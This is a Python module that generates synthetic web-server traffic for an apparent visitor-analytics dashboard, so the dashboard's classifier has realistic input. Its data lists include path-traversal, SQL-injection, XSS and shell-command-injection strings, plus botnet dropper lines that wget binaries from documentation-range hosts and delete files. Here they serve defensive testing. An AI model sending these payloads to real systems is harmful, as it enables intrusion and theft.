"""Synthetic traffic, for looking around and for the screenshots.

Two jobs. It gives anyone a populated dashboard without waiting for a site to be
crawled, and it is how the screenshots in README.md are reproduced when the UI
changes — without it they are unrepeatable and slowly drift away from the code.

Every address comes from the RFC 5737 documentation ranges (192.0.2.0/24,
198.51.100.0/24, 203.0.113.0/24). None of them belongs to a real host, so nothing
here can be mistaken for a real visitor. That is deliberate: screenshots taken
from production would publish the IPs, cities and networks of actual people.

Classes are *not* assigned by hand. The traffic carries the patterns the
classifier actually reads — probe paths, traversal, dropper command lines — so
what the dashboard shows is its real output, not a staged picture of it.

This lives in src/ rather than scripts/ because DEMO_MODE runs it inside the
container, and the image copies src/ and nothing else. scripts/seed_demo.py is
the command-line front for the same function.
"""

from __future__ import annotations

import random
from datetime import datetime, timedelta, timezone

SEED = 20260817

# (country, code, city, lat, lon, isp, org, asn)
PLACES = [
    ("Germany", "DE", "Berlin", 52.52, 13.40, "Deutsche Telekom", "DTAG", "AS3320"),
    ("Germany", "DE", "Munich", 48.14, 11.58, "Vodafone", "Vodafone DE", "AS3209"),
    ("United States", "US", "Ashburn", 39.04, -77.49, "Amazon", "AWS", "AS16509"),
    ("United States", "US", "San Francisco", 37.77, -122.42, "Cloudflare", "CF", "AS13335"),
    ("Netherlands", "NL", "Amsterdam", 52.37, 4.90, "Hetzner", "Hetzner", "AS24940"),
    ("France", "FR", "Paris", 48.86, 2.35, "OVH", "OVH SAS", "AS16276"),
    ("United Kingdom", "GB", "London", 51.51, -0.13, "British Telecom", "BT", "AS2856"),
    ("Poland", "PL", "Warsaw", 52.23, 21.01, "Orange", "Orange PL", "AS5617"),
    ("Sweden", "SE", "Stockholm", 59.33, 18.06, "Telia", "Telia", "AS3301"),
    ("Singapore", "SG", "Singapore", 1.35, 103.82, "DigitalOcean", "DO", "AS14061"),
    ("Brazil", "BR", "Sao Paulo", -23.55, -46.63, "Vivo", "Telefonica", "AS27699"),
    ("Japan", "JP", "Tokyo", 35.68, 139.69, "NTT", "NTT Com", "AS4713"),
    ("Canada", "CA", "Toronto", 43.65, -79.38, "Bell", "Bell Canada", "AS577"),
    ("Australia", "AU", "Sydney", -33.87, 151.21, "Telstra", "Telstra", "AS1221"),
    ("India", "IN", "Mumbai", 19.08, 72.88, "Jio", "Reliance", "AS55836"),
    ("Spain", "ES", "Madrid", 40.42, -3.70, "Movistar", "Telefonica ES", "AS3352"),
]

CLOUD = ("Amazon", "DigitalOcean", "OVH", "Hetzner")

BROWSERS = [
    (
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/131.0 Safari/537.36",
        "HTTP/2.0",
        "br, gzip",
    ),
    (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/130.0 Safari/537.36",
        "HTTP/2.0",
        "gzip, deflate, br",
    ),
    (
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 "
        "(KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
        "HTTP/2.0",
        "gzip, br",
    ),
    (
        "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "HTTP/2.0",
        "gzip, deflate, br, zstd",
    ),
]

CRAWLERS = [
    (
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "crawl-66-249-66-1.googlebot.com",
    ),
    (
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
        "msnbot-40-77-167-1.search.msn.com",
    ),
    ("Mozilla/5.0 (compatible; GPTBot/1.0; +https://openai.com/gptbot)", ""),
    ("Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)", ""),
    (
        "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)",
        "scanner.censys.io",
    ),
]

PAGES = [
    "/",
    "/index.html",
    "/pages/about.html",
    "/pages/cv.html",
    "/pages/projects.html",
    "/pages/contact.html",
]

# Matches _SCANNER_PATH_PATTERNS — reads as a scan, not an exploit attempt.
PROBES = [
    "/wp-login.php",
    "/.env",
    "/admin/config.php",
    "/phpmyadmin/index.php",
    "/wp-admin/setup-config.php",
    "/.git/config",
    "/vendor/phpunit/phpunit.php",
    "/cgi-bin/luci",
    "/shell.php",
    "/backup.sql",
]

# Traversal, SQL injection and script payloads — the exploit_probes patterns in
# classifier/evidence_sql.py, so these IPs come out as threats/* on their own.
EXPLOITS = [
    "/../../../../etc/passwd",
    "/index.php?page=../../../../etc/passwd",
    "/search?q=1%20UNION%20SELECT%20username,password%20FROM%20users",
    "/?id=1'%20OR%20'1'='1",
    "/cgi-bin/test.cgi?cmd=cat%20/etc/shadow",
    "/comment?text=<script>alert(1)</script>",
]

# Non-HTTP request lines carrying a shell payload — threats/protocol-abusers.
DROPPERS = [
    "GET /shell?cd+/tmp;rm+-rf+*;wget+http://198.51.100.9/arm7;chmod+777+arm7 HTTP/1.0",
    "POST /GponForm/diag_Form?images/ HTTP/1.1 busybox mips",
    "GET /cgi-bin/;wget+http://192.0.2.77/x86_64+-O+/tmp/mozi HTTP/1.1",
]

REFERERS = [
    "",
    "",
    "",
    "https://www.google.com/",
    "https://news.ycombinator.com/",
    "https://github.com/",
    "https://duckduckgo.com/",
]

# Visits cluster in daytime hours, so the traffic-rhythm heatmap has a shape.
HOUR_WEIGHTS = [2, 1, 1, 1, 1, 2, 4, 7, 11, 14, 15, 14, 12, 13, 15, 14, 12, 10, 9, 8, 7, 6, 4, 3]


def _ts(rng: random.Random, day_offset: int) -> str:
    base = datetime.now(timezone.utc) - timedelta(days=day_offset)
    hour = rng.choices(range(24), weights=HOUR_WEIGHTS)[0]
    return base.replace(
        hour=hour, minute=rng.randint(0, 59), second=rng.randint(0, 59), microsecond=0
    ).isoformat()


def _geo(rng: random.Random, place: tuple, spread: float = 0.3) -> dict:
    return {
        "country": place[0],
        "country_code": place[1],
        "city": place[2],
        "lat": place[3] + rng.uniform(-spread, spread),
        "lon": place[4] + rng.uniform(-spread, spread),
        "isp": place[5],
        "org": place[6],
        "asn": place[7],
    }


def seed(rng: random.Random) -> tuple[int, int]:
    from src.db import get_conn
    from src.queries import insert_visit, upsert_ip_intel

    ips = [f"{net}{n}" for net in ("192.0.2.", "198.51.100.", "203.0.113.") for n in range(1, 61)]
    rng.shuffle(ips)
    humans, crawlers = ips[:110], ips[110:134]
    scanners, threats = ips[134:156], ips[156:168]
    clients, datacentre = ips[168:180], ips[180:]

    with get_conn() as conn:
        for ip in humans:
            place = rng.choice(PLACES)
            ua, ver, enc = rng.choice(BROWSERS)
            ref = rng.choice(REFERERS)
            day = rng.randint(0, 88)
            pages = rng.sample(PAGES, k=rng.randint(1, 5))
            if rng.random() < 0.35:
                pages += rng.sample(PAGES, k=rng.randint(1, 3))
            for i, page in enumerate(pages):
                insert_visit(
                    conn,
                    ip=ip,
                    timestamp=_ts(rng, day),
                    method="GET",
                    path=page,
                    server_port=443,
                    status=200,
                    bytes_sent=rng.randint(1800, 24000),
                    user_agent=ua,
                    referer=ref if i == 0 else f"https://example.com{pages[i - 1]}",
                    request_time=round(rng.uniform(0.004, 0.09), 3),
                    ssl_protocol="TLSv1.3",
                    http_version=ver,
                    accept_encoding=enc,
                    sec_fetch_dest="document",
                    sec_fetch_mode="navigate",
                    sec_fetch_site="none" if i == 0 else "same-origin",
                    accept_language=rng.choice(
                        ["de-DE,de;q=0.9", "en-US,en;q=0.9", "fr-FR;q=0.8"]
                    ),
                    connection=rng.randint(1000, 99999),
                    connection_requests=i + 1,
                )
            upsert_ip_intel(conn, {"ip": ip, **_geo(rng, place), "is_mobile": int("iPhone" in ua)})

        for ip in crawlers:
            ua, rdns = rng.choice(CRAWLERS)
            for _ in range(rng.randint(4, 30)):
                insert_visit(
                    conn,
                    ip=ip,
                    timestamp=_ts(rng, rng.randint(0, 88)),
                    method="GET",
                    path=rng.choice(PAGES + ["/sitemap.xml", "/robots.txt"]),
                    server_port=443,
                    status=rng.choice([200, 200, 200, 304, 404]),
                    bytes_sent=rng.randint(400, 9000),
                    user_agent=ua,
                    request_time=round(rng.uniform(0.002, 0.05), 3),
                    ssl_protocol="TLSv1.3",
                    http_version="HTTP/1.1",
                    device="Bot",
                    connection=rng.randint(1000, 99999),
                )
            upsert_ip_intel(
                conn,
                {
                    "ip": ip,
                    **_geo(rng, rng.choice(PLACES), 0.4),
                    "reverse_dns": rdns,
                    "is_hosting": 1,
                },
            )

        for ip in scanners:
            place = rng.choice([p for p in PLACES if p[5] in CLOUD])
            ua = rng.choice(["", "Mozilla/5.0 zgrab/0.x", "python-requests/2.31.0", "curl/8.4.0"])
            for _ in range(rng.randint(4, 18)):
                insert_visit(
                    conn,
                    ip=ip,
                    timestamp=_ts(rng, rng.randint(0, 88)),
                    method=rng.choice(["GET", "GET", "POST", "HEAD"]),
                    path=rng.choice(PROBES),
                    server_port=rng.choice([80, 443]),
                    status=rng.choice([404, 404, 404, 403, 400]),
                    bytes_sent=rng.randint(0, 600),
                    user_agent=ua,
                    request_time=round(rng.uniform(0.001, 0.02), 3),
                    http_version="HTTP/1.1",
                    connection=rng.randint(1000, 99999),
                )
            upsert_ip_intel(
                conn,
                {
                    "ip": ip,
                    **_geo(rng, place, 0.5),
                    "is_hosting": 1,
                    "is_tor": int(rng.random() < 0.10),
                    "is_proxy": int(rng.random() < 0.18),
                    "dnsbl_listed": int(rng.random() < 0.22),
                    "open_ports": [22, 80, 443] if rng.random() < 0.5 else [22, 8080],
                    "vulns": ["CVE-2023-44487"] if rng.random() < 0.3 else [],
                    "tags": ["scanner"] if rng.random() < 0.55 else [],
                },
            )

        for ip in threats:
            place = rng.choice([p for p in PLACES if p[5] in CLOUD])
            for _ in range(rng.randint(3, 14)):
                if rng.random() < 0.3:
                    insert_visit(
                        conn,
                        ip=ip,
                        timestamp=_ts(rng, rng.randint(0, 60)),
                        method="NON-HTTP",
                        path=rng.choice(DROPPERS),
                        server_port=80,
                        status=400,
                        user_agent="",
                        request_time=0.001,
                        connection=rng.randint(1000, 99999),
                    )
                else:
                    insert_visit(
                        conn,
                        ip=ip,
                        timestamp=_ts(rng, rng.randint(0, 60)),
                        method=rng.choice(["GET", "POST"]),
                        path=rng.choice(EXPLOITS),
                        server_port=rng.choice([80, 443]),
                        status=rng.choice([404, 403, 400]),
                        bytes_sent=rng.randint(0, 400),
                        user_agent=rng.choice(["", "curl/7.68.0", "Mozilla/5.0 zgrab/0.x"]),
                        request_time=round(rng.uniform(0.001, 0.02), 3),
                        http_version="HTTP/1.1",
                        connection=rng.randint(1000, 99999),
                    )
            upsert_ip_intel(
                conn,
                {
                    "ip": ip,
                    **_geo(rng, place, 0.5),
                    "is_hosting": 1,
                    "is_tor": int(rng.random() < 0.25),
                    "dnsbl_listed": int(rng.random() < 0.5),
                    "open_ports": [22, 23, 80, 443, 8080],
                    "vulns": ["CVE-2023-44487", "CVE-2021-44228"],
                    "tags": ["malicious", "scanner"],
                },
            )

        for ip in clients:
            ua = rng.choice(["curl/8.4.0", "Wget/1.21.4", "python-requests/2.31.0"])
            for _ in range(rng.randint(1, 8)):
                insert_visit(
                    conn,
                    ip=ip,
                    timestamp=_ts(rng, rng.randint(0, 88)),
                    method="GET",
                    path=rng.choice(PAGES),
                    server_port=443,
                    status=200,
                    bytes_sent=rng.randint(900, 12000),
                    user_agent=ua,
                    request_time=round(rng.uniform(0.003, 0.04), 3),
                    ssl_protocol="TLSv1.2",
                    http_version="HTTP/1.1",
                    connection=rng.randint(1000, 99999),
                )
            upsert_ip_intel(conn, {"ip": ip, **_geo(rng, rng.choice(PLACES))})

        for ip in datacentre:
            place = rng.choice([p for p in PLACES if p[5] in CLOUD])
            for _ in range(rng.randint(1, 5)):
                insert_visit(
                    conn,
                    ip=ip,
                    timestamp=_ts(rng, rng.randint(0, 88)),
                    method="GET",
                    path="/",
                    server_port=443,
                    status=200,
                    bytes_sent=1800,
                    user_agent="",
                    request_time=0.006,
                    http_version="HTTP/1.1",
                    connection=rng.randint(1000, 99999),
                )
            upsert_ip_intel(
                conn,
                {
                    "ip": ip,
                    **_geo(rng, place, 0.4),
                    "is_hosting": 1,
                    "tags": ["cloud"] if rng.random() < 0.4 else [],
                },
            )

        visits = conn.execute("SELECT COUNT(*) FROM visits").fetchone()[0]
        addrs = conn.execute("SELECT COUNT(*) FROM ip_intel").fetchone()[0]
    return visits, addrs
